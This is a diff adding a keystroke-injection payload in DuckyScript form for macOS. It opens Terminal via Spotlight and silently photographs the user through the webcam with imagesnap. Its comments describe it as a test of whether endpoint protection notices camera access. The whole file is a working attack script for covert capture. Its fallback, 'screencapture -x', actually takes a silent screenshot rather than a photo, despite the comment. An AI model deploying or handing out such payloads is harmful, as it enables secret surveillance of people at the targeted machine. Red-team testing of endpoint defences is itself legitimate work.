@@ -1,0 +1,21 @@
+REM ============================================================
+REM  macOS · Camera Snapshot
+REM ============================================================
+REM  Uses imagesnap (or the built-in avfoundation) to take a
+REM  photo from the webcam silently. Tests whether camera
+REM  access is logged or alerted by endpoint protection.
+REM
+REM  Output: ~/Desktop/snapshot.jpg
+REM  Requires imagesnap: brew install imagesnap
+
+DEFAULTDELAY 80
+
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 400
+ENTER
+DELAY 1500
+STRINGLN if command -v imagesnap &>/dev/null; then imagesnap -w 1 ~/Desktop/snapshot.jpg && echo "Snapshot saved"; else echo "imagesnap not found, using screencapture as fallback" && screencapture -x ~/Desktop/snapshot.jpg; fi
+DELAY 2000
+STRINGLN exit
